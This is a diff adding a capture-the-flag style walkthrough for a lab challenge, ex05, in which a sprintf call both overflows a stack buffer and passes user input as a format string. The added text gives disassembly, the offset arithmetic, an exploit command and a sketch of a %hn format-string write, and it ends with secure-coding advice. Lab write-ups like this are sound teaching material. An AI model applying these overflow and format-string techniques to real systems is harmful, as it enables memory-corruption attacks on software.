@@ -338,8 +338,58 @@ reading the faulting EIP) because stack alignment makes the arithmetic environme
 
 ---
 
-<!-- ex05 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex05 … ex11: in progress._
+### ex05 — `sprintf` overflow (and a format-string bug)
+
+**Goal (`README.txt`):** see *“you have hit the target correctly :)”*.
+
+**Vulnerability class:** two bugs in one `sprintf(buf, user)` call — an **unbounded write**
+(CWE-121) *and* a **format-string** bug (CWE-134, attacker controls the format).
+
+**Disassembly (`vuln`, called as `vuln(argv[1])`):**
+
+```asm
+080483f4 <vuln>:
+ 80483f7: sub    esp,0x68
+ 80483fa: mov    DWORD PTR [ebp-0xc],0x0     ; target = 0
+ 8048401: mov    eax,DWORD PTR [ebp+0x8]     ; arg (= argv[1])
+ 8048404: mov    DWORD PTR [esp+0x4],eax     ; sprintf 2nd arg = FORMAT = arg
+ 8048408: lea    eax,[ebp-0x4c]             ; dst buffer
+ 804840e: call   sprintf@plt                 ; sprintf(buffer, arg)   <-- bug
+ 8048413: mov    eax,DWORD PTR [ebp-0xc]
+ 8048416: cmp    eax,0xdeadbeef             ; target == 0xdeadbeef ?
+ 804841b: jne    8048429
+ 804841d: ... puts("you have hit the target correctly :)")
+```
+
+**Reading it:** `sprintf` is called with only two arguments — destination and
+`arg` — so `arg` **is the format string**. The destination `buffer` is at `ebp-0x4c`,
+the `target` at `ebp-0xc`.
+
+**Primary exploit — literal overflow.** A plain string has no `%`, so `sprintf` copies it
+verbatim into the 64-byte buffer and keeps going into `target`. Offset
+`(ebp-0xc) − (ebp-0x4c) = 0x40 = 64`, then the 4 bytes `ef be ad de` (`0xdeadbeef`, no NUL).
+
+```bash
+/opt/hole-in-bin/ex05/bin "$(python3 scripts/ex05.py)"
+```
+
+**Result (verified):** `you have hit the target correctly :)`.
+
+**Bonus — format-string path.** Because `arg` is the format, you can avoid the overflow
+entirely and write `0xdeadbeef` into `target` with `%n`. Put `&target` into the buffer, use a
+large field width to reach the needed byte count, then `%hn` twice (two 16-bit "short writes",
+`0xbeef` and `0xdead`) to avoid printing billions of characters. This needs the fixed stack
+address of `target` (ASLR off in the VM: find it once in GDB — `p &target`), e.g.
+`[addr+2][addr]` + width + `%hn%hn` with the right argument index. Documented here as an
+alternative; the literal overflow is simpler and address-independent.
+
+**Key takeaway:** `sprintf(dst, user)` is doubly dangerous — never pass untrusted data as a
+format. Use `sprintf(dst, "%s", user)` *and* a bounded `snprintf`.
+
+---
+
+<!-- ex06 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex06 … ex11: in progress._
 
 ---
 
